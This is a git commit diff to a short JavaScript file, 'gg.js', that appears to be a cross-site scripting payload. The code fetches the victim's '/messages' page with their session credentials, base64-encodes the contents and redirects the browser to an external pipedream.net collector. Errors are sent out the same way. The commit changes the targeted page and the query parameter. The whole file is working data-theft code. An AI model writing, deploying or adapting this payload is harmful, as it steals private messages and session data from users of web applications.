b68271016550d386dc8cec3c4be02c8dd4a8fb12
hefrcoo <150366484+hefrcoo@users.noreply.github.com>
2025-10-04 00:30:40 +0200

    Update gg.js

--- gg.js
+++ gg.js
@@ -3,15 +3,15 @@ var options = {
             mode: "no-cors",
       credentials: "include"
         }
-var url = `/support`;
+var url = `/messages`;
 response = fetch(url, options).then(r => {
     if (!r.ok) throw new Error("HTTP " + r.status);
     return r.text();
   })
   .then(txt => {
-    document.location = "https://eoeipamgnflz15n.m.pipedream.net?" + btoa(txt);
+    document.location = "https://eoeipamgnflz15n.m.pipedream.net?p=" + btoa(txt);
   })
   .catch(err => {
     const encodedErr = btoa(String(err));
-    document.location = "https://eoeipamgnflz15n.m.pipedream.net?" + encodedErr;
+    document.location = "https://eoeipamgnflz15n.m.pipedream.net?p=" + encodedErr;
   });
